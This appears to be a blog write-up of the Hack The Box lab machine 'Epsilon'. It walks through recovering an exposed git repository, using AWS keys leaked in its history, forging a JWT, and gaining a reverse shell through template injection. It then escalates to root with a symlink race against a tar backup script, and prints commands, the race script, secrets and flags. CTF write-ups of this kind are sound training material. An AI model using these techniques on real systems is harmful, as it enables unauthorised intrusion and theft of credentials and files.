+++
title = "HTB: Epsilon"
date = "2022-07-06T20:51:39-05:00"
author = "l0gan334"
authorTwitter = "" #do not include @
cover = "Epsilon.png"
tags = ["hacking", "ctf", "git", "HTB", "linux", "jwt", "aws"]
description = "**HTB | Epsilon - Write up**"
showFullContent = false
readingTime = false
hideComments = false
+++

**Epsilon** is the first machine I rooted so it's very special for me :). 

We are going to start by finding a git repository on the webserver, this will leak the source code of the site and also AWS keys.

Then we will get access to lambda functions that contain the information we need to create a valid JWT to log in the website.

Next up we are going to exploit a Server Side Template Injection in order to get command execution. 

And lastly we are going to work our way to root taking advantage of a backup script using tar to get a copy of root's home directory.


# **```Recon```**
# Nmap

We are going to use **nmap** to do the basic enumeration:
```bash
❯ sudo nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.96.151 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 21:04 -05
Initiating SYN Stealth Scan at 21:04
Scanning 10.129.96.151 [65535 ports]
Discovered open port 80/tcp on 10.129.96.151
Discovered open port 22/tcp on 10.129.96.151
Discovered open port 5000/tcp on 10.129.96.151
Completed SYN Stealth Scan at 21:04, 14.73s elapsed (65535 total ports)
Nmap scan report for 10.129.96.151
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds
           Raw packets sent: 72046 (3.170MB) | Rcvd: 71900 (2.877MB)
```

We are exporting the result in grepable format to **allPorts**, which is great to manage with regex and get all the ports without needing to type them one by one:

{{< code language="bash" title="Here you have an useful function you can use for this manner" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep initiated | awk 'NF{print $NF}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat extractPorts.tmp
	rm extractPorts.tmp
}
{{< /code >}}

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.96.151
	[*] Open ports: 22,80,5000

[*] Ports copied to clipboard
```

Now that we have the opened ports we can examinate them deeply:
```bash
❯ nmap -sCV -p22,80,5000 10.129.96.151 -on targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-06 21:08 -05
Failed to resolve "targeted".
Failed to resolve "targeted".
Nmap scan report for 10.129.96.151
Host is up (0.16s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
| http-git:
|   10.129.96.151:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Failed to resolve "targeted".
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.10 seconds
```

**Port 5000** offers a login panel that we have no credentials for:
{{< image src="/img/eps1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

On the other hand the http server in **port 80** returns a **403 Forbidden** but nmap finds a git repository in **/.git/**.
{{< image src="/img/eps2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Although it's also forbidden we can recompose it with **githack**:
```bash
❯ githack http://10.129.96.151/.git/

INFO:githack.scanner:Target: http://10.129.96.151/.git/
ERROR:githack.scanner:HTTP Error 404: Not Found: http://10.129.96.151/.git/logs/refs/stash
ERROR:githack.scanner:HTTP Error 404: Not Found: http://10.129.96.151/.git/refs/remotes/origin/master
ERROR:githack.scanner:HTTP Error 404: Not Found: http://10.129.96.151/.git/refs/stash
INFO:githack.scanner:commit: c51441640fd25e9fba42725147595b5918eba0f1
INFO:githack.scanner:commit: 7cf92a7a09e523c1c667d13847c9ba22464412f3
INFO:githack.scanner:commit: c622771686bd74c16ece91193d29f85b5f9ffa91
INFO:githack.scanner:tree: cf489a3776d2bf87ac32de4579e852a4dc116ce8
INFO:githack.scanner:tree: b5f4c99c772eeb629e53d284275458d75ed9a010
INFO:githack.scanner:commit: b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
INFO:githack.scanner:Blob: 545f6fe2204336c1ea21720cbaa47572eb566e34
INFO:githack.scanner:tree: ab07f7cdc7f410b8c8f848ee5674ec550ecb61ca
INFO:githack.scanner:Blob: dfdfa17ca5701b1dca5069b6c3f705a038f4361e
INFO:githack.scanner:tree: 65b80f62da28254f67f0bea392057fd7d2330e2d
INFO:githack.scanner:Blob: 8d3b52e153c7d5380b183bbbb51f5d4020944630
INFO:githack.scanner:Blob: fed7ab97cf361914f688f0e4f2d3adfafd1d7dca
INFO:githack.scanner:Total: 2
INFO:githack.scanner:[OK] track_api_CR_148.py: ('8d3b52e153c7d5380b183bbbb51f5d4020944630', 'blob')
INFO:githack.scanner:[OK] server.py: ('dfdfa17ca5701b1dca5069b6c3f705a038f4361e', 'blob')
```

We get this two files:
```bash
❯ ls
 server.py  track_api_CR_148.py
```

The first one being the script behind the server in **port 5000**:
```python
#!/usr/bin/python3

import jwt
from flask import *

app = Flask(__name__)
secret = '<secret_key>'

def verify_jwt(token,key):
	try:
		username=jwt.decode(token,key,algorithms=['HS256',])['username']
		if username:
			return True
		else:
			return False
	except:
		return False

@app.route("/", methods=["GET","POST"])
def index():
	if request.method=="POST":
		if request.form['username']=="admin" and request.form['password']=="admin":
			res = make_response()
			username=request.form['username']
			token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
			res.set_cookie("auth",token)
			res.headers['location']='/home'
			return res,302
		else:
			return render_template('index.html')
	else:
		return render_template('index.html')

@app.route("/home")
def home():
	if verify_jwt(request.cookies.get('auth'),secret):
		return render_template('home.html')
	else:
		return redirect('/',code=302)

@app.route("/track",methods=["GET","POST"])
def track():
	if request.method=="POST":
		if verify_jwt(request.cookies.get('auth'),secret):
			return render_template('track.html',message=True)
		else:
			return redirect('/',code=302)
	else:
		return render_template('track.html')

@app.route('/order',methods=["GET","POST"])
def order():
	if verify_jwt(request.cookies.get('auth'),secret):
		if request.method=="POST":
			costume=request.form["costume"]
			message = '''
			Your order of "{}" has been placed successfully.
			'''.format(costume)
			tmpl=render_template_string(message,costume=costume)
			return render_template('order.html',message=tmpl)
		else:
			return render_template('order.html')
	else:
		return redirect('/',code=302)
app.run(debug='true')
```

We don't get so much valuable information from this other than that the server is running in **Flask** and it's requesting an 'auth' cookie.

```python
import io
import os
from zipfile import ZipFile
from boto3.session import Session


session = Session(
    aws_access_key_id='<aws_access_key_id>',
    aws_secret_access_key='<aws_secret_access_key>',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilon.htb')
aws_lambda = session.client('lambda')


def files_to_zip(path):
    for root, dirs, files in os.walk(path):
        for f in files:
            full_path = os.path.join(root, f)
            archive_name = full_path[len(path) + len(os.sep):]
            yield full_path, archive_name


def make_zip_file_bytes(path):
    buf = io.BytesIO()
    with ZipFile(buf, 'w') as z:
        for full_path, archive_name in files_to_zip(path=path):
            z.write(full_path, archive_name)
    return buf.getvalue()


def update_lambda(lambda_name, lambda_code_path):
    if not os.path.isdir(lambda_code_path):
        raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path))
    aws_lambda.update_function_code(
        FunctionName=lambda_name,
        ZipFile=make_zip_file_bytes(path=lambda_code_path))
```

In this file we get to see some information about **AWS** but all the interesting variables like the keys are not shown.

However, as this is a git repository we can check for other commits:
```bash
❯ git log --oneline
c622771 (HEAD -> master) Fixed Typo
b10dd06 Adding Costume Site
c514416 Updatig Tracking API
7cf92a7 Adding Tracking API Module
```

There are four commits. With **git diff** we can get the changes made from commit to commit:
```bash
❯ git diff c622771 7cf92a7

......

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index 8d3b52e..fed7ab9 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,11 +5,11 @@ from boto3.session import Session


 session = Session(
-    aws_access_key_id='<aws_access_key_id>',
-    aws_secret_access_key='<aws_secret_access_key>',
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
     region_name='us-east-1',
-    endpoint_url='http://cloud.epsilon.htb')
-aws_lambda = session.client('lambda')
+    endpoint_url='http://cloud.epsilong.htb')
+aws_lambda = session.client('lambda')
 ```

 That's way better, now we have all the information we need to play with **AWS** using the command line tool **aws** (```sudo apt instal awscli```).

 First we have to configure it:
 ```bash
 ❯ aws configure

AWS Access Key ID [****************6TDC]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [****************Fo1A]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [us-east-1]: us-east-1
Default output format [json]: json
```

Now we can start exploring.

We earlier saw some code about lambda functions, running **aws help** we find a way to list them:

We have to specify the **endpoint url** so it connects to the machine and not the actual AWS, so we will add this to the **/etc/hosts**.

```bash
❯ aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2022-07-07T01:52:40.856+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "a53bc9e0-7b29-4726-b0c1-3d75d452321f",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

There's one function, we can get its code finding its location that's why we use **get-function**:
```bash
❯ aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2022-07-07T01:52:40.856+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "a53bc9e0-7b29-4726-b0c1-3d75d452321f",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
```

There we have it:
```bash
❯ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code

--2022-07-06 21:43:04--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolving cloud.epsilon.htb (cloud.epsilon.htb)... 10.129.96.151
Connecting to cloud.epsilon.htb (cloud.epsilon.htb)|10.129.96.151|:80... connected.
HTTP request sent, awaiting response... 200
Length: 478 [application/zip]
Saving to: ‘code’

code                                 100%[===================================================================>]     478  --.-KB/s    in 0s

2022-07-06 21:43:04 (68.8 MB/s) - ‘code’ saved [478/478]

```

We get a Zip File:
```bash
❯ file code
code: Zip archive data, at least v2.0 to extract, compression method=deflate

❯ unzip code
Archive:  code
  inflating: lambda_function.py
```

And inside **lambda_function.py** we get the secret:
```bash
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
```

With this secret we can create our own **JWT** for the website in Port 5000:

From this part of the code we know that we need a **username** field and it's using **HS256** as algorithm:

```python
def verify_jwt(token,key):
	try:
		username=jwt.decode(token,key,algorithms=['HS256',])['username']
		if username:
			return True
		else:
			return False
	except:
		return False
```

Now we can proceed:

```python
❯ python3

Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> secret = "RrXCv`mrNe!K!4+5`wYq"
>>> jwt.encode({"username":"l0gan334"}, secret, algorithm='HS256')
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImwwZ2FuMzM0In0.bRBgArDxh54bJT9eBnbV3XZsAARByURuCfi2HApcXUg'
```

With the name 'auth' we will add this cookie to the webserver:
{{< image src="/img/eps3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Now we have access!
{{< image src="/img/eps4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

In **/order** there is some sort of ordering panel that doesn't look to do much:
{{< image src="/img/eps5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Depending on what we choose in the *costume* it's the output:
{{< image src="/img/eps6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

{{< image src="/img/eps7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Knowing this we will launch **Burpsuite** and do some tests over this request.


After making the usual test for Server Side Template Injection we get this:

{{< image src="/img/eps8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

{{< image src="/img/eps9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

If we input a mahtematical operation between double curly braces and we get the result that means the website is **vulnerable**. 

With a SSTI we can do a lot of things but what we are looking for is command execution.

A place to find the payload we need for this manner is **PayloadsAllTheThings**:

{{< image src="/img/eps10.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

{{< image src="/img/eps11.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We are going to try any of this payloads:

{{< image src="/img/eps13.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}
{{< image src="/img/eps12.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It works, now we can get a reverse shell:

{{< image src="/img/eps14.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We will represent the '**&**' in urlencode ('**%26**') for this to work:

```bash
❯ nc -lvnp 334

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.96.151.
Ncat: Connection from 10.129.96.151:35358.
bash: cannot set terminal process group (1058): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$
```

We have a shell but not a **tty** so we will do a **tty treatment**:
```bash
tom@epsilon:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
tom@epsilon:/var/www/app$ ^Z
zsh: suspended  nc -lvnp 334

❯ stty raw -echo; fg
[1]  + continued  nc -lvnp 334
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

And finally the last touches:
```bash
tom@epsilon:/var/www/app$ export TERM=xterm
tom@epsilon:/var/www/app$ export SHELL=bash
tom@epsilon:/var/www/app$ stty rows 40 columns 140
```

This way we will have the correct screen size (you can find your own with ```stty size```) and we are also able to do ^L.

In our user's home directory we find the **user.txt**:
```bash
tom@epsilon:~$ ls
user.txt
tom@epsilon:~$ cat user.txt
a78de636a8ec1c5a51720d733ec29a3f
```

First part is done, now let's move on to the privesc.

**```Privilege escalation```**

We will deploy **pspy** to enumerate the machine:
```bash
tom@epsilon:/tmp$ wget 10.10.14.161/pspy
--2022-07-07 03:27:08--  http://10.10.14.161/pspy
Connecting to 10.10.14.161:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1152160 (1.1M) [application/octet-stream]
Saving to: ‘pspy’

pspy                                 100%[===================================================================>]   1.10M   930KB/s    in 1.2s

2022-07-07 03:27:09 (930 KB/s) - ‘pspy’ saved [1152160/1152160]

tom@epsilon:/tmp$ chmod +x pspy
```

After we run it we find that it's executing a backup script:
```text
tom@epsilon:/tmp$ ./pspy
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/07/07 03:28:54 CMD: UID=0    PID=99     |
2022/07/07 03:28:54 CMD: UID=0    PID=98     |
2022/07/07 03:28:54 CMD: UID=0    PID=100    |
2022/07/07 03:28:54 CMD: UID=0    PID=10     |
2022/07/07 03:28:54 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity
2022/07/07 03:29:01 CMD: UID=0    PID=3374   | /usr/sbin/CRON -f
2022/07/07 03:29:01 CMD: UID=0    PID=3375   | /bin/sh -c /usr/bin/backup.sh
2022/07/07 03:29:01 CMD: UID=0    PID=3376   | /bin/bash /usr/bin/backup.sh
2022/07/07 03:29:01 CMD: UID=0    PID=3379   | /usr/bin/tar -cvf /opt/backups/250784282.tar /var/www/app/
2022/07/07 03:29:01 CMD: UID=0    PID=3381   | /bin/bash /usr/bin/backup.sh
2022/07/07 03:29:01 CMD: UID=0    PID=3380   | sha1sum /opt/backups/250784282.tar
2022/07/07 03:29:01 CMD: UID=0    PID=3382   | sleep 5
2022/07/07 03:29:06 CMD: UID=0    PID=3384   | /usr/bin/tar -chvf /var/backups/web_backups/262301287.tar /opt/backups/checksum /opt/backups/250784282.tar
```

```bash
tom@epsilon:/tmp$ cat /usr/bin/backup.sh
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d   -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```

This script:
- Removes everything inside /opt/backups.
- Creates a tar archive inside /opt/backups/ with the contents of /var/www/app.
- Creates /opt/backups/checksum which contains the SHA1 hash of the new .tar file.
- Sleeps for five seconds
- Creates a new tar archive in /var/backups/web_backups containing the first archive and the checksum file.
- Remove all files and folders from /opt/backups.


This script uses a lot ```tar```, but the interesting part is the **-h** parameter:
```text
-h, --dereference
	Follow symlinks; archive and dump the files they point to.
```

We have control over **/opt/backups**, so this is the plan:

```bash
while :; do 
	if test -f checksum; then 
		rm -f checksum; 
		ln -s /root checksum; 
		echo "Replaced checksum"; 
		sleep 5; 
		echo "Backup probably done now";
		break;
	fi; 
	sleep 1; 
done
```

We will be checking for the existence of checksum in the current directory. When it does exist, we will remove it and replace it with a sym link to root's directory folder.

This way the script will create a .tar with root's home directory inside /var/backups/web_backups:

```bash
tom@epsilon:/opt/backups$ ./hijack.sh
Replaced checksum
Backup probably done now
tom@epsilon:/opt/backups$ ls -l /var/backups/web_backups
total 79440
-rw-r--r-- 1 root root  1003520 Jul  7 04:00 280773967.tar
-rw-r--r-- 1 root root 80343040 Jul  7 04:01 311618336.tar
```

There's a significally bigger file which is the one with the content we need:

```bash
tom@epsilon:/opt/backups$ cp /var/backups/web_backups/311618336.tar /tmp/
```

We copy it to **/tmp** and extract it:
```bash
tom@epsilon:/tmp$ tar -xf 311618336.tar
tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted
tar: Exiting with failure status due to previous errors
tom@epsilon:/tmp$ ls
311618336.tar
hijack.sh
opt
pspy
```

Even though we get some errors we get a folder **opt**, and many directories inside, the root flag:
```bash
tom@epsilon:/tmp$ cd opt/backups/checksum/
tom@epsilon:/tmp/opt/backups/checksum$ ls
docker-compose.yml  lambda.sh  root.txt  src
tom@epsilon:/tmp/opt/backups/checksum$ cat root.txt
3abf016adaf60d863a43b4fcc061562e
```

See you next time!